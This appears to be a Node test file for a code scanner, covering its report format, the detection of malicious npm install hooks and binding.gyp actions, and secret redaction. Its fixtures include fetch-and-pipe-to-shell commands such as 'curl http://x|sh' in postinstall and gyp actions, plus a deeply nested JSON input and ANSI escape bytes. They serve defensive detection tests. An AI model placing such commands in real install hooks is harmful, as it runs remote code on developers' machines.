// New lazaret report format tests + supply-chain manifest scanning + redaction.

import { test } from "node:test";
import assert from "node:assert/strict";
import { buildResult, jsonRenderer, printReport, safeExcerpt, issueExcerpt } from "../src/report.js";
import { scanManifest, scanGyp, redactResult, redactSecretSnippet, INSTALL_HOOK_RE } from "../src/lib/supplychain.js";
import { scanFile } from "../src/scanner/scan.js";

const F = (name, content) => ({ name, content, lang: "py", dep: false });

test("report format: key order (generatedBy FIRST), sections, gate math", () => {
  const res = buildResult("/proj", [F("a.py", "x=1\n")], []);
  const keys = Object.keys(res);
  assert.equal(keys[0], "generatedBy");
  assert.equal(res.generatedBy, "lazaret-cli-1");
  // section order mirrors lazaret.py build_result
  assert.deepEqual(keys, [
    "generatedBy", "project", "scannedAt", "pass", "conditions", "metrics",
    "counts", "ratings", "supplyChain", "crossFile", "perFile", "issues",
  ]);
  assert.equal(res.pass, true);
  assert.equal(res.conditions.length, 6);
  assert.deepEqual(res.counts, { VULN: 0, HOTSPOT: 0, BUG: 0, SMELL: 0 });
  assert.deepEqual(res.ratings, { security: "A", reliability: "A", maintainability: "A" });
  assert.match(res.scannedAt, /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}$/);
  assert.deepEqual(res.perFile, {});
});

test("report format: failing project (parity with cfgproj example)", () => {
  const issues = scanFile({ name: "app.py", content: "import os\nos.system(cmd)\n", lang: "py" });
  const res = buildResult("/proj", [F("app.py", "import os\nos.system(cmd)\n")], issues);
  assert.equal(res.pass, false);
  assert.equal(res.metrics.files, 1);
  assert.equal(res.perFile["app.py"], issues.length);
  const cond = Object.fromEntries(res.conditions.map((c) => [c.label, c.ok]));
  assert.equal(cond["No critical vulnerabilities"], false);
});

test("jsonRenderer emits generatedBy as the literal first key", () => {
  const text = jsonRenderer(buildResult("/p", [], []));
  assert.match(text.slice(0, 80), /^\{\n  "generatedBy": "lazaret-cli-1"/);
});

test("supply chain: any lifecycle script → SC-INSTALL-HOOK MAJOR; fetch/eval → CRITICAL", () => {
  // spec 3: a non-suspicious prepare-family hook of a checked-out project is
  // INFO (it runs for the developer's own `npm install`); install hooks stay MAJOR
  const benign = JSON.stringify({ scripts: { prepare: "mkdir dist", postinstall: "node x.js" } });
  const [a, p] = scanManifest("package.json", benign);
  assert.equal(a.rule, "SC-INSTALL-HOOK");
  assert.equal(a.sev, "MAJOR");
  assert.equal(p.sev, "INFO");

  const evil = JSON.stringify({ scripts: { postinstall: "node -e 'require(\"child_process\").exec(\"curl x|sh\")'" } });
  const [b] = scanManifest("package.json", evil);
  assert.equal(b.sev, "CRITICAL");

  assert.ok(INSTALL_HOOK_RE.test("curl http://x | bash"));
  assert.ok(!INSTALL_HOOK_RE.test("mkdir dist"));
});

test("supply chain: binding.gyp actions flagged, gyp file in repo fixture detected", () => {
  const gyp = JSON.stringify({
    targets: [{ target_name: "x", actions: [{ action_name: "run", action: ["bash", "-c", "curl http://x|sh"] }] }],
  });
  const [i] = scanGyp("binding.gyp", gyp);
  assert.equal(i.rule, "SC-INSTALL-HOOK");
  assert.equal(i.sev, "CRITICAL");

  const benign = JSON.stringify({ targets: [{ actions: [{ action: ["echo", "hi"] }] }] });
  const [b] = scanGyp("binding.gyp", benign);
  assert.equal(b.sev, "MAJOR");
});

test("supply chain: hostile deep manifest is SC-MANIFEST-DEPTH — never a crash, never silent", () => {
  // V8's JSON.parse is iterative (no RecursionError equivalent), so the depth
  // is checked before parsing, like the Python engine's recursion limit.
  const deep = '{"a":'.repeat(50000) + "1" + "}".repeat(50000);
  const out = scanManifest("package.json", deep);
  assert.deepEqual(out.map((i) => [i.rule, i.sev]), [["SC-MANIFEST-DEPTH", "CRITICAL"]]);
  // invalid JSON: the ROOT manifest of a project scan is a finding (spec 3);
  // any other manifest yields nothing (this used to be [] for the root too)
  assert.deepEqual(scanManifest("package.json", "{not json at all").map((i) => [i.rule, i.sev]),
    [["SC-MANIFEST-UNPARSEABLE", "MAJOR"]]);
  assert.deepEqual(scanManifest("sub/package.json", "{not json at all"), []);
  // a root manifest whose top level is not an object is unparseable too
  assert.deepEqual(scanManifest("package.json", "[1,2,3]").map((i) => i.msg),
    ["package.json could not be parsed (top level is a list, not an object); its install hooks could not be checked."]);
  assert.deepEqual(scanManifest("sub/package.json", "null"), []);
});

test("redaction: SECRET-rule flagged line replaced by deterministic placeholder", () => {
  const lines = ["a=1", 'api_key = "Zk9mS3B4NjdxTW5xU2Y4QWJ"'];
  const out = redactSecretSnippet("S-ENTROPY", lines, 1, lines[1]);
  assert.match(out[1], /^\[redacted: secret rule S-ENTROPY\] \(\d+ chars\)$/);
  assert.equal(out[0], "a=1");
  // deterministic: same input twice → same text
  assert.equal(out[1], redactSecretSnippet("S-ENTROPY", lines, 1, lines[1])[1]);
});

test("redaction: context lines swept for OTHER credentials (audit L1)", () => {
  const lines = ["aws_key", "AKIAIOSFODNN7EXAMPLE", "x=1"];
  const out = redactSecretSnippet("S-SECRET", lines, 0, lines[0]);
  assert.ok(out[1].includes("[redacted]"));
  assert.ok(!out[1].includes("AKIAIOSFODNN7EXAMPLE"));
});

test("redaction: redactResult sweeps a full result, secrets never leak", () => {
  const res = { issues: [{
    rule: "S-ENTROPY", line: 2, snipStart: 1, name: "e", type: "HOTSPOT", sev: "MAJOR",
    msg: "", why: "", fix: "", ref: "", file: "a.py",
    snippet: ["x=0", 'token = "Zk9mS3B4NjdxTW5xU2Y4QWJ"', "AKIAIOSFODNN7EXAMPLE"],
  }] };
  redactResult(res);
  const blob = JSON.stringify(res);
  assert.ok(!blob.includes("Zk9mS3B4NjdxTW5xU2Y4"));
  assert.ok(!blob.includes("AKIAIOSFODNN7EXAMPLE"));
  assert.ok(blob.includes("[redacted: secret rule S-ENTROPY]"));
});

test("terminal hygiene: safeExcerpt strips ANSI/control bytes (audit H1)", () => {
  const hostile = "\u001b[31mRED\u001b[0m\t\u0007X";
  const ex = safeExcerpt(hostile);
  assert.ok(!ex.includes("\u001b"));
  assert.ok(!ex.includes("\u0007"));
  assert.ok(ex.includes("·"));
  // truncation
  assert.ok(safeExcerpt("x".repeat(200), 100).endsWith("…"));
});

test("printReport: gate, conditions, ratings, counts; quiet suppresses issues", () => {
  const lines = [];
  const res = buildResult("/p", [F("a.py", "x=1\n")], []);
  printReport(res, { out: (s) => lines.push(s), quiet: true });
  const text = lines.join("\n");
  assert.match(text, /Quality gate: PASSED/);
  assert.match(text, /Ratings: security A/);
  const noisy = [];
  printReport(buildResult("/p", [F("a.py", "eval(x)\n")],
    scanFile({ name: "a.py", content: "eval(x)\n", lang: "py" })), { out: (s) => noisy.push(s) });
  assert.ok(noisy.join("\n").includes("S-EVAL-PY"));
});

test("issueExcerpt: flagged line text for terminal, '' when unavailable", () => {
  const issues = scanFile({ name: "a.py", content: "x=1\neval(y)\n", lang: "py" });
  assert.match(issueExcerpt(issues.find((i) => i.rule === "S-EVAL-PY")), /eval\(y\)/);
  assert.equal(issueExcerpt({ line: 9, snipStart: 1, snippet: [] }), "");
});
